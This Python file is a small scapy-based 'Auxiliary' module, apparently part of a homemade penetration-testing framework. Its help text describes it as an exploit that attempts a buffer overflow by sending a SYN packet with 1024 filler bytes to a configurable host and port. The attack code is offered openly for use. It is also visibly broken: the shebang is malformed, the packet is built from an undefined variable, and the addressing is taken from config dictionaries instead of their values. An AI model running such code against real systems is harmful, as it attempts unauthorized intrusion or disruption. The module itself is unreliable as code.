#!usr/bin/python

from scapy.all import *
from colorama import *
import threading

class Auxiliary:
	config={
		"RHOST": {"default":"127.0.0.1", "necessity":True},
		"RPORT": {"default":4444, "necessity":True}
	}

	def run(self):
		ip = IP(dst=self.config["RHOST"])
		tcp = TCP(sport=RandShort(), dport=self.config["RPORT"], flags="S")
		data = Raw(b"X"*1024)
		packet = ip / tcp / raw
		send(packet)

	def show_options(self):
		print(Fore.YELLOW+"Options\t\tNecessity\t\tDefault"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------\t\t---------\t\t-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+"%s\t\t%s\t\t\t%s" % (
				key, self.config[key]["necessity"], self.get_config(key))+Style.RESET_ALL)
	

	@staticmethod
	def show_info():
		print(Fore.YELLOW+"\nThis exploit tries to do a buffer \noverflow to the given ip and port"+Style.RESET_ALL)

	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key]["default"] = value
		else:
			print("No options")
	
	
	def get_config(self, key):
		return self.config[key]["default"]
